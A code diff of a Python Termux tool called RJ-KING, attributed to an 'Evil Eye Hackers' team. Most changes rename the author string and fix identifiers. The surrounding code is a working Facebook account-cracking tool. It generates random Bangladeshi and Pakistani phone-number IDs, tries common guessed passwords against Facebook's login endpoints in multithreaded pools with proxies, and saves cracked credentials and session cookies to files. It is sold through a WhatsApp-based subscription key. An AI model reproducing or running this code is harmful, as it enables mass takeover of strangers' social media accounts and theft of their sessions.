@@ -1,6 +1,6 @@
-#created by RJ Raju Razz
+#created by RJRajuRazz
 #team name Evil Eye Hackers
-#tottaly written by RJ Raju Razz
+#tottaly written by RJRajuRazz
 #!/usr/bin/python3 
 #---------------------[IMPORT]---------------------#
 
@@ -328,9 +328,9 @@ def banner2():
    
   
 {warna}---------------------------------------------------{P}
- Author    {M}:\033[1;37m RJ Raju Razz 
- Github    {M}:\033[1;37m RJ Raju Razz
- Facebook  {M}:\033[1;37m RJ Raju Razz
+ Author    {M}:\033[1;37m RJRajuRazz 
+ Github    {M}:\033[1;37m RJRajuRazz
+ Facebook  {M}:\033[1;37m RJRajuRazz
  Tool Name {M}:\033[1;37m RJ-KING
  Future    {M}:\033[1;37m {H}F{P}|{H}R{P}|{H}N{P}|{H}G{P}
  Status    {M}:\033[1;32m Premium{P}
@@ -348,7 +348,7 @@ except:
     kok=open('/data/data/com.termux/files/usr/bin/.88888Pro777phpo-cov', 'w')
     kok.write(myid)
     kok.close()
-def Subscraption():
+def Subscription():
     key1=open('/data/data/com.termux/files/usr/bin/.88888Pro777phpo-cov', 'r').read()
     os.system('clear')
     banner2()
@@ -363,10 +363,10 @@ def Subscraption():
         print(f"{RED}Hi Dear User 👿Your Subscription is Expired{N}")
         time.sleep(2)
         os.system("clear")
-        banner2();print(f"\033[1;37m[\033[1;31m✓\033[1;37m] {RED}{BA}Hi Dear User😈  Your Key is Not Approved{N}");print (f"\033[1;37m[\033[1;31m✓\033[1;37m]\033[1;34m Key {P}= {warna}"+key1);print(led);print(f"\033[1;37m[\033[1;32m•\033[1;37m] Tools {M}: {H}Facebook cloning {N}");print(f"\033[1;37m[\033[1;32m•\033[1;37m] Note {M} :{K} {BA}Free user don't come inbox {N}");print(led);print(f'{H}{BA}The benefits you will get at our command{N}');print(led);print(f'{P}[{M}•{P}] File Create{N} ');print(f'{P}[{M}•{P}] File Cloning{N} ');print(f'{P}[{M}•{P}] Gmail Cloning{N} ');print(f'{P}[{M}•{P}] Number Cloning{N} ');print(f'{P}[{M}•{P}] RJ Raju Razz New cloning {N} ');print(f'{P}[{M}•{P}] Random Uid Cloning{N} ');print(led);print(f'{N}{BA}If you want to buy this command then\n choose option number one{N}');print(led);print(f'{P}[{H}1{P}] {H}I want to buy RJ Raju Razz Command{N} ');print(f'{P}[{B}2{P}] {B}Contract RJ Raju Razz Admin{N} ');print(f'{P}[{K}3{P}] {K}Join RJ Raju Razz Group{N} ');print(f'{P}[{RED}4{P}] {RED}Exit RJ Raju Razz Terminal');print(led)
+        banner2();print(f"\033[1;37m[\033[1;31m✓\033[1;37m] {RED}{BA}Hi Dear User😈  Your Key is Not Approved{N}");print (f"\033[1;37m[\033[1;31m✓\033[1;37m]\033[1;34m Key {P}= {warna}"+key1);print(led);print(f"\033[1;37m[\033[1;32m•\033[1;37m] Tools {M}: {H}Facebook cloning {N}");print(f"\033[1;37m[\033[1;32m•\033[1;37m] Note {M} :{K} {BA}Free user don't come inbox {N}");print(led);print(f'{H}{BA}The benefits you will get at our command{N}');print(led);print(f'{P}[{M}•{P}] File Create{N} ');print(f'{P}[{M}•{P}] File Cloning{N} ');print(f'{P}[{M}•{P}] Gmail Cloning{N} ');print(f'{P}[{M}•{P}] Number Cloning{N} ');print(f'{P}[{M}•{P}] RJRajuRazz New cloning {N} ');print(f'{P}[{M}•{P}] Random Uid Cloning{N} ');print(led);print(f'{N}{BA}If you want to buy this command then\n choose option number one{N}');print(led);print(f'{P}[{H}1{P}] {H}I want to buy RJRajuRazz Command{N} ');print(f'{P}[{B}2{P}] {B}Contract RJRajuRazz Admin{N} ');print(f'{P}[{K}3{P}] {K}Join RJRajuRazz Group{N} ');print(f'{P}[{RED}4{P}] {RED}Exit RJRajuRazz Terminal');print(led)
         opt = input(f'{P}[{M}+{P}] Choose {M}:{H} ')
         if opt =='1':
-            tks = '*Jay Shree Ram*%2C%20*RJ Raju Razz-SIR*%20*I*%20*WANT*%20*TO*%20*BUY*%20*YOUR*%20*NEW*%20*---*%20*RJ-KING%20*---*%20*Version%20:%3.0.5%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20*My*%20*Key*%20*='+key1
+            tks = '*Jay Shree Ram*%2C%20*RJRajuRazz-SIR*%20*I*%20*WANT*%20*TO*%20*BUY*%20*YOUR*%20*NEW*%20*---*%20*RJ-KING%20*---*%20*Version%20:%3.0.5%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20*My*%20*Key*%20*='+key1
             os.system('xdg-open  https://wa.me/+919954282827?text='+tks)
             Subscription()
         if opt =='2':
@@ -399,10 +399,10 @@ def Subscription():
         print(f"{RED}Hi Dear User 👿Your Subscription is Expired{N}")
         time.sleep(2)
         os.system("clear")
-        banner2();print(f"\033[1;37m[\033[1;31m✓\033[1;37m] {RED}{BA}Hi Dear User😎  Your Key is Not Approved{N}");print (f"\033[1;37m[\033[1;31m✓\033[1;37m]\033[1;34m Key {P}= {warna}"+key1);print(led);print(f"\033[1;37m[\033[1;32m•\033[1;37m] Tools {M}: {H}Facebook cloning {N}");print(f"\033[1;37m[\033[1;32m•\033[1;37m] Note {M} :{K} {BA}Free user don't come inbox {N}");print(led);print(f'{H}{BA}The benefits you will get at our command{N}');print(led);print(f'{P}[{M}•{P}] File Create{N} ');print(f'{P}[{M}•{P}] File Cloning{N} ');print(f'{P}[{M}•{P}] Gmail Cloning{N} ');print(f'{P}[{M}•{P}] Number Cloning{N} ');print(f'{P}[{M}•{P}] RJ Raju Razz New cloning {N} ');print(f'{P}[{M}•{P}] Random Uid Cloning{N} ');print(led);print(f'{N}{BA}If you want to buy this command then\n choose option number one{N}');print(led);print(f'{P}[{H}1{P}] {H}I want to buy RJ Raju Razz Command{N} ');print(f'{P}[{B}2{P}] {B}Contract RJ Raju Razz Admin{N} ');print(f'{P}[{K}3{P}] {K}Join RJ Raju Razz Group{N} ');print(f'{P}[{RED}4{P}] {RED}Exit RJ Raju Razz Terminal');print(led)
+        banner2();print(f"\033[1;37m[\033[1;31m✓\033[1;37m] {RED}{BA}Hi Dear User😎  Your Key is Not Approved{N}");print (f"\033[1;37m[\033[1;31m✓\033[1;37m]\033[1;34m Key {P}= {warna}"+key1);print(led);print(f"\033[1;37m[\033[1;32m•\033[1;37m] Tools {M}: {H}Facebook cloning {N}");print(f"\033[1;37m[\033[1;32m•\033[1;37m] Note {M} :{K} {BA}Free user don't come inbox {N}");print(led);print(f'{H}{BA}The benefits you will get at our command{N}');print(led);print(f'{P}[{M}•{P}] File Create{N} ');print(f'{P}[{M}•{P}] File Cloning{N} ');print(f'{P}[{M}•{P}] Gmail Cloning{N} ');print(f'{P}[{M}•{P}] Number Cloning{N} ');print(f'{P}[{M}•{P}] RJRajuRazz New cloning {N} ');print(f'{P}[{M}•{P}] Random Uid Cloning{N} ');print(led);print(f'{N}{BA}If you want to buy this command then\n choose option number one{N}');print(led);print(f'{P}[{H}1{P}] {H}I want to buy RJRajuRazz Command{N} ');print(f'{P}[{B}2{P}] {B}Contract RJRajuRazz Admin{N} ');print(f'{P}[{K}3{P}] {K}Join RJRajuRazz Group{N} ');print(f'{P}[{RED}4{P}] {RED}Exit RJRajuRazz Terminal');print(led)
         opt = input(f'{P}[{M}+{P}] Choose {M}:{H} ')
         if opt =='1':
-            tks = '*Jay Shree Ram*%2C%20*RJ Raju Razz-SIR*%20*I*%20*WANT*%20*TO*%20*BUY*%20*YOUR*%20*NEW*%20*---*%20*RJ-KING Tool%20*3.0.5---*%20*Version%20:%3.0.%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20*My*%20*Key*%20*='+key1
+            tks = '*Jay Shree Ram*%2C%20*RJRajuRazz-SIR*%20*I*%20*WANT*%20*TO*%20*BUY*%20*YOUR*%20*NEW*%20*---*%20*RJ-KING Tool%20*3.0.5---*%20*Version%20:%3.0.%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20*My*%20*Key*%20*='+key1
             os.system('xdg-open  https://wa.me/+919954282827?text='+tks)
             Subscription()
         if opt =='2':
@@ -436,7 +436,7 @@ frm = requests.get("http://ip-api.com/json/").json()["country"]
 #---------------------[MAIN MENU]---------------------#
 
 def menu():
-            os.system('clear');banner2();print(f'{P}[{warn}1{P}] File Cloning menu');print(f'{P}[{warn}2{P}] Remove Duplicate File');print(f'{P}[{warn}3{P}] Bd RJ-KING Random Cloning {H}Try');print(f'{P}[{warn}4{P}] Bd RJ-KING Random Cloning {K}Slow ');print(f'{P}[{warn}5{P}] Bd RJ-KING Cloning  ');print(f'{P}[{warn}6{P}] Pak RJ-KING  Random Cloning ');print(f'{P}[{warn}7{P}] Gmail Cloning ');print(f'{P}[{warn}8{P}] Follow me on Facebook');print(f'{P}[{RED}9{P}] {RED}Exit RJ Raju Razz Terminal');print(led)
+            os.system('clear');banner2();print(f'{P}[{warn}1{P}] File Cloning menu');print(f'{P}[{warn}2{P}] Remove Duplicate File');print(f'{P}[{warn}3{P}] Bd RJ-KING Random Cloning {H}Try');print(f'{P}[{warn}4{P}] Bd RJ-KING Random Cloning {K}Slow ');print(f'{P}[{warn}5{P}] Bd RJ-KING Cloning  ');print(f'{P}[{warn}6{P}] Pak RJ-KING  Random Cloning ');print(f'{P}[{warn}7{P}] Gmail Cloning ');print(f'{P}[{warn}8{P}] Follow me on Facebook');print(f'{P}[{RED}9{P}] {RED}Exit RJRajuRazz Terminal');print(led)
             RJRajuRazznil=input(f'{P}[{warn}+{P}] Put Option {M}:{H} ')
             if RJRajuRazznil in ['1','01']:
                  crack_file()
@@ -559,18 +559,18 @@ def s11():
         for check1 in idf:
             idf = check+checkx+check1
             pwv = [checkx+check1,check1[1:],uid,uid[:7]]
-            RJ Raju Razz_xd.submit(filexxxx,idf,pwv)
+            RJRajuRazzxd.submit(filexxxx,idf,pwv)
     print(led);print(f'{N} Hi Dear User 😈 Your Crack process has been completed');print(f' {P}Total ok : {H}'+str(len(ok)));print(f' {P}Total cp : {K}'+str(len(cp)));print(led)
     input('Press Enter To Go Menu')
     menu()
     
-def RJ Raju Razzx():
+def RJRajuRazzx():
     user=[]
     os.system('clear');banner2();print(f' Example{M} : {P}[{H}01996*****{P}]');print(f' Example{M} : {P}[{H}01779*****{P}]');print(f' Example{M} : {P}[{H}01667*****{P}]');print(f' Example{M} : {P}[{H}01886*****{P}]');print(f' Example{M} : {P}[{H}01301*****{P}]');print(led)
     c_mange = input(f'{K} Put Number {M}:{H} ');print(led);print(f' Example : {P}[{H}3000{P}|{H}5000{P}|{H}7000{P}|{H}10000{P}]');print(led)
     limit = int(input(f' {P}Input Limit {M}:{H}  '))
     if len(c_mange) < 3:
-        print(f'\n{M} Hi Bro maybe u input wrong number');time.sleep(2);RJ Raju Razzx()
+        print(f'\n{M} Hi Bro maybe u input wrong number');time.sleep(2);RJRajuRazzx()
     else:
         pass
     kode = c_mange[0:-7]
@@ -605,7 +605,7 @@ def bd3():
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(7))
         idf.append(nmp)
-    with ThreadPool(max_workers=40) as RJ Raju Razz_xd:
+    with ThreadPool(max_workers=40) as RJRajuRazzxd:
         os.system('clear')
         banner2()
         idx = str(len(idf))
@@ -613,7 +613,7 @@ def bd3():
         for check1 in idf:
             idf = check+check1
             pwv = [idf,check1,idf[:7],idf[:6],check1[1:],'bangladesh','freefire','Free Fire','i love you']
-            RJ Raju Razz_xd.submit(filexxxx,idf,pwv)
+            RJRajuRazz_xd.submit(filexxxx,idf,pwv)
     print(led);print(f'{N} Hi Dear User Crack process has been completed');print(f' {P}Total ok : {H}'+str(len(ok)));print(f' {P}Total cp : {K}'+str(len(cp)));print(led)
     input('Press Enter To Go Menu');menu()
 
@@ -629,7 +629,7 @@ def bd2():
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(7))
         idf.append(nmp)
-    with ThreadPool(max_workers=40) as RJ Raju Razz_xd:
+    with ThreadPool(max_workers=40) as RJRajuRazzxd:
         os.system('clear')
         banner2()
         idx = str(len(idf))
@@ -638,7 +638,7 @@ def bd2():
             idf = check+check1
             #pwv = [idf,'BANGLADESH','freefire','Free Fire','i love you']
             pwv = [idf,check1,idf[:7],idf[:6],check1[1:]]
-            RJ Raju Razz_xd.submit(filexxxx,idf,pwv)
+            RJRajuRazzxd.submit(filexxxx,idf,pwv)
     print(led);print(f'{N} Hi Dear User Crack process has been completed');print(f' {P}Total ok : {H}'+str(len(ok)));print(f' {P}Total cp : {K}'+str(len(cp)));print(led)
     input('Press Enter To Go Menu');menu()
 def pk2():
@@ -649,7 +649,7 @@ def pk2():
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(7))
         idf.append(nmp)
-    with ThreadPool(max_workers=70) as RJ Raju Razz_xd:
+    with ThreadPool(max_workers=70) as RJRajuRazzxd:
         os.system('clear')
         banner2()
         idx = str(len(idf))
@@ -657,7 +657,7 @@ def pk2():
         for check1 in idf:
             idf = check+check1
             pwv = [idf,check1,'khankhan','khan1122','khan12345','khan123','khan123456','khankhan123']
-            RJ Raju Razz_xd.submit(filexxxx,idf,pwv)
+            RJRajuRazzxd.submit(filexxxx,idf,pwv)
     print(led);print(f'{N} Hi Dear User Crack process has been completed');print(f' {P}Total ok : {H}'+str(len(ok)));print(f' {P}Total cp : {K}'+str(len(cp)));print(led)
     input('Press Enter To Go Menu');menu()
 loop = 0
@@ -707,11 +707,11 @@ def setting():
         method.append('mix_crack')
         password()
     elif hc in ['3','03']:
-        method.append('RJ Raju Razz_crack')
+        method.append('RJRajuRazz_crack')
         password()
     
     else:
-        method.append('RJ Raju Razz_crack')
+        method.append('RJRajuRazz_crack')
         password()
 def password():
     clear();banner2();print(f'\x1b[1;97mTotal Idz Crack  {M}: {H}'+str(len(id)));print(led);print(f'\x1b[1;97m[1] \033[1;97mCrack Auto Pass \033[1;92mName+123');print(f'\x1b[1;97m[2] \033[1;97mCrack Auto Pass \033[1;92mName+1234');print(f'\x1b[1;97m[3] \033[1;97mCrack Auto Pass \033[1;92mName+1234+12345');print(f'\x1b[1;97m[4] \033[1;97mCrack Ind/Pak \033[1;92mName+786+Khan12');print(led)
@@ -773,7 +773,7 @@ def passwrd3():
                 for xpwd in pwnya:
                     pwv.append(xpwd)
             else:pass
-            if 'RJ Raju Razz_crack' in method:
+            if 'RJRajuRazz_crack' in method:
                 pool.submit(crackxxx,idf,pwv)
             elif 'mix_crack' in method:
                     pool.submit(filexxxx1,idf,pwv)
@@ -826,7 +826,7 @@ def passwrd2():
                 for xpwd in pwnya:
                     pwv.append(xpwd)
             else:pass
-            if 'RJ Raju Razz_crack' in method:
+            if 'RJRajuRazz_crack' in method:
                 pool.submit(crackxxx,idf,pwv)
             elif 'mix_crack' in method:
                     pool.submit(filexxxx1,idf,pwv)
@@ -879,7 +879,7 @@ def pwb():
                 for xpwd in pwnya:
                     pwv.append(xpwd)
             else:pass
-            if 'RJ Raju Razz_crack' in method:
+            if 'RJRajuRazz_crack' in method:
                 pool.submit(filexxxx,idf,pwv)
             elif 'mix_crack' in method:
                 pool.submit(filexxxx1,idf,pwv)
@@ -930,7 +930,7 @@ def passwrd():
                 for xpwd in pwnya:
                     pwv.append(xpwd)
             else:pass
-            if 'RJ Raju Razz_crack' in method:
+            if 'RJRajuRazz_crack' in method:
                 pool.submit(crackxxx,idf,pwv)
             elif 'mix_crack' in method:
                 pool.submit(filexxxx1,idf,pwv)
@@ -988,7 +988,7 @@ def filexxxx(idf,pwv):
             session = requests.Session()
             ps = ps.lower()
             animasi = random.choice(["\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING","\x1b[1;97mKING","\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING"])
-            sys.stdout.write(f'\r\x1b[1;97m[\033[1;92mRJ Raju Razz\033[1;97m] %s| \x1b[1;97m[\033[1;92mM-2\033[1;97m]{O} OK{P}-{H}%s \x1b[1;97m\r'%(loop,len(ok))),
+            sys.stdout.write(f'\r\x1b[1;97m[\033[1;92mRJRajuRazz\033[1;97m] %s| \x1b[1;97m[\033[1;92mM-2\033[1;97m]{O} OK{P}-{H}%s \x1b[1;97m\r'%(loop,len(ok))),
             sys.stdout.flush()
             pro = random.choice(agents)
             free_fb = session.get('https://www.facebook.com/?').text
@@ -1032,17 +1032,17 @@ def filexxxx(idf,pwv):
                 coki1 = coki.split("1000")[1]
                 uid = "1000"+coki1[0:11]
                 ok.append(uid)
-                print('\x1b[1;92m[RJ Raju Razz-OK] '+uid+'|'+ps+'\33[0;97m '+Jawnx(uid)+' ');print('\x1b[1;92m[COOKIE-:] '+coki)
+                print('\x1b[1;92m[RJRajuRazz-OK] '+uid+'|'+ps+'\33[0;97m '+Jawnx(uid)+' ');print('\x1b[1;92m[COOKIE-:] '+coki)
                 cek_apk(session,coki)
-                open('/sdcard/RJ Raju Razz-OK.txt', 'a').write(uid+' | '+ps+'\n ')
+                open('/sdcard/RJRajuRazz-OK.txt', 'a').write(uid+' | '+ps+'\n ')
                 #follow(ses,coki)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 coki1 = coki.split("1000")[1]
                 uid = "1000"+coki1[0:11]
-                print(f'{A}[RJ Raju Razz-CP] '+uid+'|'+ps+' \33[0;97m'+Jawnx(uid)+' ')
-                open('/sdcard/RJ Raju Razz-CP.txt', 'a').write(uid+' | '+ps+'\n')
+                print(f'{A}[RJRajuRazz-CP] '+uid+'|'+ps+' \33[0;97m'+Jawnx(uid)+' ')
+                open('/sdcard/RJRajuRazz-CP.txt', 'a').write(uid+' | '+ps+'\n')
                 cp.append(uid)
                 break
             else:
@@ -1063,7 +1063,7 @@ def filexxxx1(idf,pwv):
             session = requests.Session()
             ps = ps.lower()
             animasi = random.choice(["\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING","\x1b[1;97mKING","\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING"])
-            sys.stdout.write(f'\r\x1b[1;97m[\033[1;92mRJ Raju Razz\033[1;97m] %s| \x1b[1;97m[\033[1;92mM-2\033[1;97m]{O} OK{P}-{H}%s \x1b[1;97m\r'%(loop,len(ok))),
+            sys.stdout.write(f'\r\x1b[1;97m[\033[1;92mRJRajuRazz\033[1;97m] %s| \x1b[1;97m[\033[1;92mM-2\033[1;97m]{O} OK{P}-{H}%s \x1b[1;97m\r'%(loop,len(ok))),
             sys.stdout.flush()
             pro = random.choice(agents)
             free_fb = session.get('https://www.facebook.com/?').text
@@ -1105,17 +1105,17 @@ def filexxxx1(idf,pwv):
                 coki1 = coki.split("1000")[1]
                 uid = "1000"+coki1[0:11]
                 ok.append(uid)
-                print('\x1b[1;92m[RJ Raju Razz-OK] '+uid+'|'+ps+'\33[0;97m '+Jawnx(uid)+' ');print('\x1b[1;92m[COOKIE-:] '+coki)
+                print('\x1b[1;92m[RJRajuRazz-OK] '+uid+'|'+ps+'\33[0;97m '+Jawnx(uid)+' ');print('\x1b[1;92m[COOKIE-:] '+coki)
                 cek_apk(session,coki)
-                open('/sdcard/RJ Raju Razz-OK.txt', 'a').write(uid+' | '+ps+'\n ')
+                open('/sdcard/RJRajuRazz-OK.txt', 'a').write(uid+' | '+ps+'\n ')
                 #follow(ses,coki)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 coki1 = coki.split("1000")[1]
                 uid = "1000"+coki1[0:11]
-                print(f'{A}[RJ Raju Razz-CP] '+uid+'|'+ps+' \33[0;97m'+Jawnx(uid)+' ')
-                open('/sdcard/RJ Raju Razz-CP.txt', 'a').write(uid+' | '+ps+'\n')
+                print(f'{A}[RJRajuRazz-CP] '+uid+'|'+ps+' \33[0;97m'+Jawnx(uid)+' ')
+                open('/sdcard/RJRajuRazz-CP.txt', 'a').write(uid+' | '+ps+'\n')
                 cp.append(uid)
                 break
             else:
@@ -1128,7 +1128,7 @@ def crackxxx(idf,pwv):
     global loop,ok,cp
     animasi = random.choice(["\x1b[1;91mFB-KING","\x1b[1;92mX-GREEN","\x1b[1;93mFB-KING","\x1b[1;94mFB-KING","\x1b[1;95mX-GREEN","\x1b[1;96mFB-KING","\x1b[1;97mX-GREEN","\x1b[1;91mFB-KING","\x1b[1;92mX-GREEN","\x1b[1;93mFB-KING","\x1b[1;94mFB-KING","\x1b[1;95mX-GREEN","\x1b[1;96mFB-KING"])
     animas = random.choice(["\x1b[1;91m--","\x1b[1;92m--","\x1b[1;93m--","\x1b[1;94m--","\x1b[1;95m--","\x1b[1;96m👑","\x1b[1;97m--","\x1b[1;91m--","\x1b[1;92m--","\x1b[1;93m--","\x1b[1;94m--","\x1b[1;95m--","\x1b[1;96m--"])
-    sys.stdout.write(f'\r\x1b[1;97m[\033[1;92mRJ Raju Razz-XD\033[1;97m] %s| \x1b[1;97m[\033[1;92mM-3\033[1;97m]{O} OK{P}-{H}%s \x1b[1;97m\r'%(loop,len(ok))),
+    sys.stdout.write(f'\r\x1b[1;97m[\033[1;92mRJRajuRazz-XD\033[1;97m] %s| \x1b[1;97m[\033[1;92mM-3\033[1;97m]{O} OK{P}-{H}%s \x1b[1;97m\r'%(loop,len(ok))),
     sys.stdout.flush()
     ua = 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5'
     ua2 = 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5'
@@ -1147,17 +1147,17 @@ def crackxxx(idf,pwv):
             heade={"Host":'m.facebook.com',"viewport-width": "980","sec-ch-ua": '" Not A;Brand";v="24", "Chromium";v="116", "Google Chrome";v="100"',"sec-ch-ua-mobile": "?1","sec-ch-ua-platform": "Android","sec-ch-prefers-color-scheme": "light","dnt": "1","upgrade-insecure-requests": "1","user-agent": ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","sec-fetch-site":"none","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","accept-encoding":"gzip, deflate, br","accept-language": "en-US,en;q=0.9"}
             po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
             if "checkpoint" in po.cookies.get_dict().keys():
-                print(f'\x1b[1;93m[RJ Raju Razz-CP]  '+idf+'|'+pw+'\033[0;97m     ')
-                open('/sdcard/RJ Raju Razz-CP.txt', 'a').write(idf+'|'+pw+'|'+ua+'\n')
+                print(f'\x1b[1;93m[RJRajuRazz-CP]  '+idf+'|'+pw+'\033[0;97m     ')
+                open('/sdcard/RJRajuRazz-CP.txt', 'a').write(idf+'|'+pw+'|'+ua+'\n')
                 cp+=1
                 break
             elif "c_user" in ses.cookies.get_dict().keys():
                 ok+=1
                 koki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print(f'\x1b[1;92m[RJ Raju Razz-OK] '+idf+'|'+pw+'\033[0;97m     ')
+                print(f'\x1b[1;92m[RJRajuRazz-OK] '+idf+'|'+pw+'\033[0;97m     ')
                 print(f'\r    {P}[{H}√{P}] COOKIES   : {B}%s{P}'%(kuki))
-                open('/sdcard/RJ Raju Razz-OK.txt', 'a').write(idf+'|'+pw+'\n')
+                open('/sdcard/RJRajuRazz-OK.txt', 'a').write(idf+'|'+pw+'\n')
                 
                 break
                 
